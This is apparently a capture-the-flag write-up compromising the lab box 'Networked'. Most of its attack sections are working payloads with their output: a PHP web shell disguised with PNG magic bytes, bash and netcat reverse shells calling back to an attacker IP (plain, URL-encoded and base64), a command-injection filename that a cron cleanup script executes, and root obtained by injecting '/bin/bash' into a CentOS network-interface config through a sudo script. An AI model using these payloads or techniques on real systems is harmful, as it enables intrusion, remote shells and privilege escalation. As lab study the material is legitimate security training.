1,Recon
port scan 
	22/tcp ssh `OpenSSH 7.4 (protocol 2.0)`
	80/tcp http `Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)`
web-content enumerate 
`/backup` and `/uploads` would be useful for us.
`/backup` In this place, we can download the backup.tar
![](images/Pasted%20image%2020240925055915.png)
But for `/uploads` we did not anything.
Then we can extract this `backup.tar`
```
tar -xvf backup.tar

index.php
lib.php
photos.php
upload.php
```

When we upload a image from `/upload.php`, then we would see this image from `/photos.php`.So we guess we can upload the malicious image such as a web-shell 
![](images/Pasted%20image%2020240925061606.png)
![](images/Pasted%20image%2020240925061631.png)
I’ll jump over to the other page I have from the source, `photos.php`:
![](images/Pasted%20image%2020240925061615.png)

```
upload.php

list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }

    if (!($valid)) {
      echo "<p>Invalid image file</p>";
      displayform();
      exit;
    }
```
The code only accepts image extensions, although it doesn’t check if it has any other extension before them. This can be exploited by adding “.php” before a valid extension, which can be exploitable, depending on the Apache configuration. Let’s try uploading a normal PHP shell with a PNG extension first.

```
shell.php.png

<?php
system($_REQUEST['cmd']);
?>
```

As expected, the image gets rejected due to invalid MIME type. The magic bytes for PNG are “`89 50 4E 47 0D 0A 1A 0A`”, which can be added to the beginning of the shell.
![](images/Pasted%20image%2020240925062410.png)
And when we check the file 
```
file shell.php.png 

shell.php.png: PHP script, ASCII text
```

Then we need to do something.
```
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mine_shell.php.png
cat shell.php.png >> mine_shell.php.png
```
Then we can successfully upload it and we get a web-shell.
We need to switch to reverse shell.
```
payload:
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.6%2F443%200%3E%261%22
```

Then by check `/etc/passwd` and we can find a valid user `guly`
`guly:x:1000:1000:guly:/home/guly:/bin/bash`

2,shell as guly
We need to enumerate the existed configs and database to find the valid credit.
In the `guly` directory, there are 2 files interesting:
```
check_attack.php  crontab.guly

check_attack.php

<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}
?>

crontab.guly
*/3 * * * * php /home/guly/check_attack.php
```
`crontab.guly` shows a config that would run php `/home/guly/check_attack.php`every 3 minutes.
`check_attack.php` is a php script that processes files in the uploads directory.
And we find the `exec` method so we hope it can help us to exploit it.
```
exec("rm -f $logpath");
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```
In this place, If I can control $path or $value, there’s obvious code injection.

$path is set statically at the top of the file. But $value is not. I’ll open a php shell again and see what’s happening. It starts by reading all the files in the uploads directory, and using preg_grep to select ones that don’t start with .. I can do something similar in my directory with with the site source, and a test file:
```
root@kali# ls -a
.  ..  index.php  lib.php  photos.php  .test  upload.php

php > $files = preg_grep('/^([^.])/', scandir('.')); print_r($files);
Array
(
    [5] => index.php
    [6] => lib.php
    [7] => photos.php
    [8] => upload.php
)
```
Now there’s a `foreach` over $files where the number is stored as $key and the filename as $value.
$value is passed to `getnameCheck()`, and the resulting $name and $value are passed to `check_ip()`:
```
list ($name,$ext) = getnameCheck($value);
$check = check_ip($name,$value);
```
If `$check[0]` is false, the code will reach the target line.

In `lib.php`, `check_ip` just runs $name through filter_var, which is using FILTER_VALIDATE_IP to check for valid IP addresses. As `getnameCheck()` is exactly the same as `getnameUpload()` above, $name will be anything before the first .

This means any file I write in the uploads directory that isn’t named a valid IP will be passed to the part I can inject into.

(To put it more simply, this `check_attack.php` is responsible for deleting invalid files, and there is command injection when deleting, so we only need to deliberately create invalid files to trigger the injection point.)

In this place, we need to choose a good payload.
Shells on this box we kind of annoying. This is a good case of remembering to always try to run a shell yourself before trying to get another user’s process to run it. Once I was sure I had a shell that connected back when I ran it, I could use that same command for the privesc.
For example, I wanted to have guly run nc -e sh 10.10.14.7 443. This should work, as sh is in my path. But it fails:
`nc -e sh 10.10.16.6 4444`
On my listener, I see the connection, and then it immediately dies:
```
nc -lnvp 4444      
listening on [any] 4444 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.146] 60482
```

So I tested some more shells as apache. This one worked well. I base64 encoded what I wanted to run:
```
echo nc -e /bin/bash 10.10.16.6 4444 | base64 -w0

bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE2LjYgNDQ0NAo=
```

Now from apache I can run:
`echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE2LjYgNDQ0NAo= | base64 -d | bash`
Then we get a stable shell
```
nc -lnvp 4444                                    
listening on [any] 4444 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.146] 60484
id
uid=48(apache) gid=48(apache) groups=48(apache)

```

So let's combine them and  I’ll touch a file that will get a shell:
```
10_10_16_6.php.png
10_10_16_6.png
127_0_0_1.png
127_0_0_2.png
127_0_0_3.png
127_0_0_4.png
a; echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE2LjYgNDQ0NAo= | base64 -d | bash; b
index.html
```

Finally we successfully get the shell as guly
```
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.146] 60488
script /dev/null /bin/bash
sh-4.2$ id
uid=1000(guly) gid=1000(guly) groups=1000(guly)
```

3,shell as root
Firstly, I would check `sudo -l` and check guly can do what as root.
```
sudo -l

Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh

```

`-rwxr-xr-x 1 root root 422 Jul  8  2019 /usr/local/sbin/changename.sh`
We can read and exec, but not write
```
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```

The script creates a configuration for the guly0 network interface and uses “ifup guly0” to
activate it at the end. The user input is validated, and only alphanumeric characters, slashes or a dash are allowed. Network configuration scripts on CentOS are vulnerable to command injection through the attribute values as described here. This is because the scripts are sourced by the underlying service, leading to execution of anything after a space.

The response to that disclosure was that anyone who can write that file is basically root anyway, so it doesn’t matter.

The regex check at the start of the script prevents me from doing anything too complicated, but it doesn’t prevent me from getting a simple shell:

```
sudo /usr/local/sbin/changename.sh
interface NAME:
0xdf
interface PROXY_METHOD:
a /bin/bash
interface BROWSER_ONLY:
b
interface BOOTPROTO:
c

[root@networked network-scripts]# id 
uid=0(root) gid=0(root) groups=0(root)
```

Beyond Root - PHP Misconfiguration
In gaining an initial foothold, I uploaded a file `10_10_14_5.php.png`, and the webserver treated it as PHP code and ran it. I shared this link earlier. I wanted to look at the Apache configuration to see how it compared to that in the article.

The Apache config files are stored in`/etc/httpd/`. The main config is `/etc/httpd/conf/httpd.conf`, but it’s last lines are:
```
# Supplemental configuration
#
# Load config files in the "/etc/httpd/conf.d" directory, if any.
IncludeOptional conf.d/*.conf
```

Inside `/etc/http/conf.d`, I’ll find a handful of .conf files, include:
```
[root@networked ~]# ls /etc/httpd/conf.d/
autoindex.conf  php.conf  README  userdir.conf  welcome.conf
```

Checking out the `php.cong`, I’ll see the same config from the blog post:
```
[root@networked ~]# cat /etc/httpd/conf.d/php.conf 
AddHandler php5-script .php
AddType text/html .php
DirectoryIndex index.php
php_value session.save_handler "files"
php_value session.save_path    "/var/lib/php/session"
```

I can see `AddHander` for `.php`, which will has implied wildcards on each side, so it will match on `.php` anywhere in filename.
